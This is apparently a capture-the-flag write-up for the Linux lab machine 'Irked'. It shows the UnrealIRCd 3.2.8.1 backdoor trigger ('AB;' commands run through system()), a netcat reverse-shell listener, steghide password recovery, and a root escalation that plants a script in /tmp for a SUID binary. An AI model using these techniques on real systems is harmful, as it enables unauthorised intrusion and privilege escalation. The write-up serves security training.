#Linux #IRC #UnrealIRCd #steghide #SUID #CMDInjection #credentialhunting

## Overview

Irked is an easy Linux box with a memorable foothold: a backdoored build of **UnrealIRCd 3.2.8.1**, whose source was trojaned by an attacker years ago. From the IRC daemon's shell, a steganography hint leads to a password hidden in a JPEG with **steghide**, and root falls to a custom **SUID** binary that executes a file in `/tmp` I'm allowed to write.

## Recon

Web enumeration was thin, but the IRC ports run **UnrealIRCd**. That service/version is the lead.

## Foothold

### UnrealIRCd 3.2.8.1 Backdoor

> **The backdoor:** in 2009, the official UnrealIRCd 3.2.8.1 archive was compromised, someone added a hidden command. Any data prefixed with `AB;` is passed straight to `system()`. So sending `AB;<command>` to the IRC port runs that command on the server. It's a supply-chain backdoor, not a memory bug.

Using a [PoC](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor) with my IP/port and a bash reverse shell:

```sh
rlwrap nc -lvnp 53
ircd@irked:~/Unreal3.2$ whoami
ircd
```

## Privilege Escalation

### Steghide → djmardov

A second user, `djmardov`, owned the `user.txt` I couldn't read. In their Documents was a `.backup` file:

```sh
cat .backup
Super elite steg backup pw
‹redacted›
```

The "steg" hint points at **steghide**, the password unlocks data hidden in an image on the web server:

> **What steghide does:** it embeds (and password-protects) data inside the noise of an image or audio file. The visible picture looks normal; the payload is recovered only with the passphrase. The `.backup` text was that passphrase.

```sh
steghide extract -sf irked.jpg -p ‹redacted›
wrote extracted data to "pass.txt"   ->   ‹redacted›
```

That recovered password let me `su` to `djmardov`.

### SUID viewuser → Root

`djmardov` could run a custom SUID binary, `viewuser`, which tries to execute a missing file:

```sh
djmardov@irked:~$ viewuser
...
sh: 1: /tmp/listusers: not found
```

> **The flaw:** `viewuser` runs SUID-root but calls `/tmp/listusers`, a path any user can create. Whatever I put there runs as root. This is a classic case of a privileged binary trusting an attacker-writable location.

```sh
echo "sh" > /tmp/listusers
chmod +x /tmp/listusers
viewuser
# whoami
root
```

## Root

Box rooted.

## Takeaways

- **Backdoored UnrealIRCd 3.2.8.1** is a one-line RCE (`AB;cmd`), a reminder that supply-chain compromise predates the modern term for it.
- **"steg" hints mean steghide**, a passphrase found in plaintext often unlocks a hidden file.
- **SUID binaries calling writable paths are instant root.** `strings`/`ltrace` a custom SUID binary to find which file or command it trusts.
